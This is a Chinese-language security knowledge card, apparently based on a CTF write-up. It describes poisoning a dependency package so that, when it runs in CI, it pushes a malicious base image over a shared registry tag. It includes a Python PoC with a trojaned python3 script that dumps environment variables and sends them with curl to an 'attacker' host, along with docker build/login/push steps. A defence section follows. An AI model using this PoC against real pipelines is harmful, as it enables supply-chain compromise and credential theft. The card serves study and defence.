---
id: cloud-cicd-package-rce-poisoned-base-image-registry
title: 可控依赖包在 CI 中执行：构建并推送恶意基础镜像污染下游流水线运行环境
type: scenario
domain: cloud
path: cloud/ci-cd
technique: package-rce-poisoned-base-image-registry
aliases:
- 基础镜像投毒
- 镜像 tag 覆盖
- 依赖包 RCE
- GitLab registry 投毒
- CI 供应链污染
- nest-of-gold
tags:
- cicd
- supply-chain
- container
- docker
- registry
- base-image
- dependency
- credential-theft
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V658
  verified_at: '2026-11-13T06:42:23+08:00'
  notes: 已对照原文与图17核对 pygryphon 包发布、恶意 Dockerfile/python3/pip3 构建推送与 FLAG11 外带；已修正上下游措辞，官方 WP 的 curl 时机问题与原文一致。
---

## 一句话结论

攻击者控制会被下游项目安装并调用的依赖包（示例 PyPI 包 pygryphon）后，在其被调用的函数中注入代码；依赖该包的 awesome-app 项目 CI 在 pytest 时执行该函数，利用构建环境的 Docker 权限与 registry TOKEN 构建并推送一个伪装成 `gitlab:5050/wonderland/nest-of-gold/python:3.8` 的恶意基础镜像；nest-of-gold 流水线 `FROM` 该镜像后，恶意 `python3`/`pip3` 在构建或容器运行时执行 `env` 并把 `FLAG11` 外带。

## 原理

- **依赖包代码在 CI 中执行**：`pytest` 导入并调用被测应用逻辑，应用的 `hello()` 调用依赖包 `greet.hello()`；包代码因此获得构建 agent 的代码执行权限。
- **CI 暴露镜像推送能力**：流水线内有 `DOCKER_HOST`（buildkit/docker socket）与 registry 登录 token；恶意代码可直接 `docker build`/`docker push`，把恶意镜像写入私有 registry。
- **镜像 tag 可变**：下游 Dockerfile 使用 `FROM gitlab:5050/wonderland/nest-of-gold/python:3.8` 这类可变 tag；攻击者用同名 tag 覆盖后，下游构建/运行即拉取恶意镜像。
- **持久化与横向**：恶意镜像内替换 `python3`/`pip3`，在后续构建（RUN pip install）或容器启动时执行，读取环境变量 `FLAG11` 并外带；投毒只需成功一次，下游流水线每 10 分钟自动执行即持续泄露。
- **根因**：依赖信任 + CI 令牌权限过大 + 镜像 tag 未固定/未签名，三者叠加形成跨项目供应链投毒。

## 触发条件

- 攻击者控制会被下游项目安装并调用的包/依赖（PyPI、npm 等），且被 CI 构建加载。
- 构建 agent 可访问 Docker daemon（`DOCKER_HOST`），并持有可推送目标 registry 的 token。
- 下游项目 Dockerfile 使用可覆盖的镜像 tag，未固定 digest、未启用内容信任。
- 下游容器运行环境包含敏感环境变量（FLAG11）且可外连。

## 利用步骤

1. 修改可控包的 `greet.py`：在 `hello()` 中写入 Dockerfile 与假的 `python3`/`pip3` 脚本，`docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .` 并 `docker push`；构建/运行恶意镜像时 `env > /tmp/flag.txt; curl -F file=@/tmp/flag.txt http://attacker/`。
2. 在 GitLab Package Registry 删除旧包版本并发布带恶意代码的新版本。
3. awesome-app 流水线执行 `pytest` → `hello()` 触发恶意代码 → 推送恶意基础镜像。
4. nest-of-gold 流水线 `FROM` 该镜像构建/运行 → 恶意 `python3` 执行，`FLAG11` 被外带。
5. 攻击者服务器收到包含 `FLAG11=xxx` 的 multipart POST。

## PoC

```python
import subprocess

DOCKERFILE = """FROM python:3.8
COPY python3 /usr/local/bin/python3.bak
RUN mv /usr/local/bin/pip3 /usr/local/bin/pip3.bak
COPY pip3 /usr/local/bin/pip3
"""

PYTHON3 = """#!/bin/bash
env > /tmp/flag.txt;
curl http://<attacker>/ -F file=@/tmp/flag.txt
"""

PIP3 = """#!/bin/bash
/usr/local/bin/pip3.bak install -r requirements.txt
mv /usr/local/bin/python3.bak /usr/local/bin/python3
"""

def run(cmd):
    subprocess.run(cmd, shell=True, timeout=180)

def hello(name):
    run('apk add docker-cli')
    # 写 Dockerfile/python3/pip3 并 chmod +x
    run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
    run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')
    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')
    return "Hello, " + name
```

原文最终收到包含 `FLAG11=xxx` 的环境变量外带；注意官方 WP 的 curl 时机早于 FLAG 注入，需把恶意逻辑放到容器运行阶段。

## 变体与关联

- **依赖载体变体**：PyPI/npm/Maven 包、共享基础库、测试 fixture、Git 依赖（见 [[cloud-cicd-git-dependency-tag-republish-poisoning]]）。
- **镜像投毒变体**：覆盖任意可变 tag（`latest`、内部基础镜像）、投毒 build cache、替换 registry 中的构建镜像。
- **与运行期拉取投毒的区别**：[[cloud-container-registry-polling-image-tag-repoison-escape]] 是业务主机周期拉取带后门镜像；本卡是下游 CI 以被投毒镜像为基础构建/运行，入口是依赖包在 CI 中执行。
- **关联**：[[cloud-cicd-pypi-typosquat-requests-cookie-exfil]] 等包投毒卡（区别：本卡利用 CI 的 registry 权限二次投毒基础镜像，影响下游流水线）。

## 检测与防御

- **固定镜像 digest**：Dockerfile 使用 `FROM repo@sha256:...`；启用镜像签名/内容信任（cosign/Notary），registry 设置不可变 tag。
- **CI 令牌最小权限**：构建 token 禁止覆盖/推送生产/共享基础镜像；按项目隔离 registry 命名空间；使用短期凭据。
- **依赖治理**：依赖锁定与来源审查、私有代理、SBOM；对依赖包在 CI 中的代码执行做沙箱/最小权限。
- **检测**：监控镜像推送事件（新 tag、覆盖已有 tag）、异常 `docker build/push` 与 `curl -F` 外带；比对镜像 digest 与基线；对下游构建中 `env` 读取与外连告警。
